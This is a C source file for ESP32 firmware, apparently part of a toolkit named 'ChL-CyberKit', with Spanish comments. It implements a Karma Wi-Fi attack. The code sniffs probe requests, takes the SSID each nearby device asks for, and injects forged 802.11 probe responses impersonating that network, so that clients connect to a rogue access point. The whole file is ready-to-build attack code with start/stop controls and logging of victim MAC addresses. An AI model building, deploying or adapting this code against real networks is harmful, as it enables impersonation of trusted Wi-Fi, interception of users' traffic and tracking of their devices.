/**
 * @file karma.c
 * @brief Karma Attack — responde probe requests con el SSID solicitado.
 *
 * @author Pedro Luis Rezabala Delgado — ChL-CyberKit v1.0 PRO
 * @copyright Copyright (C) 2026 Pedro Luis Rezabala Delgado. GPL v3.
 */
#include "karma.h"
#include <string.h>
#include <stdint.h>
#include "esp_wifi.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"

static const char *TAG = "karma";

/* ── Estado interno ─────────────────────────────────────────────────────── */
static volatile karma_state_t s_state = KARMA_IDLE;
static karma_stats_t          s_stats;
static uint8_t                s_channel = 1;
static SemaphoreHandle_t      s_mutex   = NULL;

/* ── Frame Probe Response (template 802.11) ─────────────────────────────── */
/* radiotap (8B) + MAC header (24B) + fixed params (12B) + SSID IE variable */

static const uint8_t PROBE_RESP_TEMPLATE[] = {
    /* Radiotap header */
    0x00, 0x00, 0x08, 0x00,  /* revision, pad, len=8, present=0 */
    0x00, 0x00, 0x00, 0x00,

    /* 802.11 header — Probe Response (type=0x50) */
    0x50, 0x00,              /* frame control */
    0x00, 0x00,              /* duration */
    /* DA (será llenado) */  0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
    /* SA — BSSID propio */  0x02,0x13,0x37,0x00,0x00,0x01, /* placeholder */
    /* BSSID */              0x02,0x13,0x37,0x00,0x00,0x01,
    0x00, 0x00,              /* seq control */

    /* Fixed params */
    0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00, /* timestamp */
    0x64, 0x00,              /* beacon interval 100TU */
    0x11, 0x04,              /* capability: ESS + Privacy */

    /* SSID IE (tag=0x00, len + data rellenados dinámicamente) */
};

#define TEMPL_LEN      sizeof(PROBE_RESP_TEMPLATE)
#define OFFSET_DA      16   /* dentro del template */
#define OFFSET_SA      22
#define OFFSET_BSSID   28

/* ── Helpers ─────────────────────────────────────────────────────────────── */

/** Obtener MAC propia del ESP32 */
static void get_own_mac(uint8_t mac[6]) {
    esp_wifi_get_mac(ESP_IF_WIFI_AP, mac);
}

/** Inyectar frame por aire */
static void inject_frame(const uint8_t *buf, size_t len) {
    esp_wifi_80211_tx(WIFI_IF_AP, buf, len, false);
}

/**
 * Construir y enviar Probe Response para un determinado SSID y cliente.
 */
static void send_probe_response(const uint8_t *client_mac,
                                 const char    *ssid,
                                 uint8_t        ssid_len) {
    uint8_t frame[TEMPL_LEN + 2 + ssid_len + 14]; /* IE SSID + rates IE */
    size_t pos = 0;

    /* Copiar template */
    memcpy(frame, PROBE_RESP_TEMPLATE, TEMPL_LEN);
    pos = TEMPL_LEN;

    /* Dirección destino = MAC del cliente */
    memcpy(frame + OFFSET_DA, client_mac, 6);

    /* SA y BSSID = MAC del propio ESP32 (variar bit U/L) */
    uint8_t own[6];
    get_own_mac(own);
    /* Unicalize: poner bit local */
    own[0] = (own[0] & 0xFE) | 0x02;
    memcpy(frame + OFFSET_SA,    own, 6);
    memcpy(frame + OFFSET_BSSID, own, 6);

    /* SSID IE */
    frame[pos++] = 0x00;        /* tag: SSID */
    frame[pos++] = ssid_len;
    memcpy(frame + pos, ssid, ssid_len);
    pos += ssid_len;

    /* Supported Rates IE (obligatorio) */
    static const uint8_t RATES[] = {
        0x01, 0x08,
        0x82, 0x84, 0x8B, 0x96, 0x24, 0x30, 0x48, 0x6C
    };
    memcpy(frame + pos, RATES, sizeof(RATES));
    pos += sizeof(RATES);

    /* DS Parameter Set IE (canal) */
    frame[pos++] = 0x03;
    frame[pos++] = 0x01;
    frame[pos++] = s_channel;

    inject_frame(frame, pos);
}

/* ── API pública ─────────────────────────────────────────────────────────── */

void karma_init(void) {
    s_mutex = xSemaphoreCreateMutex();
    memset(&s_stats, 0, sizeof(s_stats));
    s_state = KARMA_IDLE;
    ESP_LOGI(TAG, "Inicializado");
}

bool karma_start(uint8_t channel) {
    if (s_state == KARMA_RUNNING) return true;
    s_channel = (channel >= 1 && channel <= 13) ? channel : 6;
    memset(&s_stats, 0, sizeof(s_stats));
    s_state = KARMA_RUNNING;
    ESP_LOGI(TAG, "Karma iniciado en CH%u", s_channel);
    return true;
}

void karma_stop(void) {
    s_state = KARMA_IDLE;
    ESP_LOGI(TAG, "Karma detenido | probes=%lu resp=%lu ssids=%lu",
             (unsigned long)s_stats.probes_seen,
             (unsigned long)s_stats.responses_sent,
             (unsigned long)s_stats.unique_ssids);
}

karma_state_t karma_get_state(void) {
    return s_state;
}

karma_stats_t karma_get_stats(void) {
    karma_stats_t snap;
    if (s_mutex && xSemaphoreTake(s_mutex, pdMS_TO_TICKS(10))) {
        snap = s_stats;
        xSemaphoreGive(s_mutex);
    } else {
        snap = s_stats;
    }
    return snap;
}

void karma_handle_mgmt(const uint8_t *payload, int len, uint8_t rssi) {
    (void)rssi;
    if (s_state != KARMA_RUNNING) return;
    if (!payload || len < 28) return;

    /* Radiotap header */
    uint16_t rt_len = (uint16_t)(payload[2] | (payload[3] << 8));
    if ((int)rt_len >= len) return;

    const uint8_t *mac_hdr = payload + rt_len;
    int mac_remain = len - (int)rt_len;
    if (mac_remain < 24) return;

    /* Verificar tipo: Probe Request = frame ctrl 0x40/0x41 */
    uint8_t fc0 = mac_hdr[0];
    uint8_t fc1 = mac_hdr[1];
    /* type=0 (management), subtype=4 (probe request) */
    if ((fc0 & 0xFC) != 0x40) return;
    if ((fc1 & 0x03) != 0x00) return;  /* no DS bits for mgmt */

    /* Source address (SA) — offset 10 en mac header */
    const uint8_t *src_mac = mac_hdr + 10;

    /* IEs empiezan en offset 24 del MAC header */
    const uint8_t *ie_ptr = mac_hdr + 24;
    int ie_len = mac_remain - 24;

    /* Buscar SSID IE (tag=0) */
    while (ie_len >= 2) {
        uint8_t tag = ie_ptr[0];
        uint8_t tlen = ie_ptr[1];
        if (tag == 0x00) { /* SSID */
            if (tlen == 0) break; /* broadcast probe — ignorar */
            if (tlen > 32)  break;

            const char *ssid = (const char *)(ie_ptr + 2);

            /* Responder */
            send_probe_response(src_mac, ssid, tlen);

            /* Estadísticas */
            if (s_mutex && xSemaphoreTake(s_mutex, pdMS_TO_TICKS(5))) {
                s_stats.probes_seen++;
                s_stats.responses_sent++;
                /* ¿SSID ya conocido? simple check con last */
                if (strncmp(s_stats.last_ssid, ssid, tlen) != 0) {
                    s_stats.unique_ssids++;
                }
                memset(s_stats.last_ssid, 0, 33);
                memcpy(s_stats.last_ssid, ssid, tlen);
                memcpy(s_stats.last_client, src_mac, 6);
                xSemaphoreGive(s_mutex);
            }

            ESP_LOGD(TAG, "Karma resp → %.*s [%02X:%02X:%02X:%02X:%02X:%02X]",
                     tlen, ssid,
                     src_mac[0],src_mac[1],src_mac[2],
                     src_mac[3],src_mac[4],src_mac[5]);
            return;
        }
        ie_ptr += 2 + tlen;
        ie_len -= 2 + tlen;
    }
}
